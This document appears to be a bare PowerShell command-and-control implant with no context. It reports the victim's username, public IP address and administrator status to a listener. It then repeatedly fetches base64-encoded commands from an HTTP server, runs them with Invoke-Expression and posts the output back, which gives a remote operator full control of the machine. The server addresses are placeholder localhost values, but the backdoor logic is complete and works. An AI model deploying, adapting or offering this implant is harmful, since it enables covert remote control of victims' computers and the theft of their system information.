$sendserver="127.0.0.1:4444";$httpserver="127.0.0.1:80";$ran=Get-Random;$lll="clients";$b64clientcheckstring="Y2xpZW50cw==";$discover="dnVsbnM=";$c=$null;$clients="Client: ";$clients+=$ran;$clients+=" ";$clients+=whoami;$clients+=" ";$clients+=(Invoke-WebRequest ifconfig.me/ip).Content.Trim();$body=$null;$hello="New windows client on ID: "+$ran;$space=" ";$currentPrincipal=New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent());if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)-eq $False){$check="we are not admin"}else{$check="we are admin"};$hello=$hello+$space+$check;try{$welcomeclient=Invoke-WebRequest -Method Post -URI $sendserver -Body $hello -UseBasicParsing}catch{Write-Output "Server isnt active."};while($true){$MAIN=Invoke-WebRequest -Timeout 1 $httpserver|Select-Object -Expand Content;if($MAIN -match $ran -and -not ($MAIN -match $b64clientcheckstring -or $MAIN -match $discover)){$REM=$MAIN -replace $ran,"";$encodedBytes=[System.Convert]::FromBase64String($REM);$StringOutput=[System.Text.Encoding]::UTF8.GetString($encodedBytes);$EXE=Invoke-Expression $StringOutput;try{$Response=Invoke-WebRequest -Method Post -URI $sendserver -Body $EXE -UseBasicParsing;sleep 2}catch{Write-Output "web server isnt running..."}}if($MAIN -match $b64clientcheckstring){try{$Response=Invoke-WebRequest -Method Post -URI $sendserver -Body $clients -UseBasicParsing;sleep 5}catch{Write-Output "web server isnt running..."}}Start-Sleep 0.4}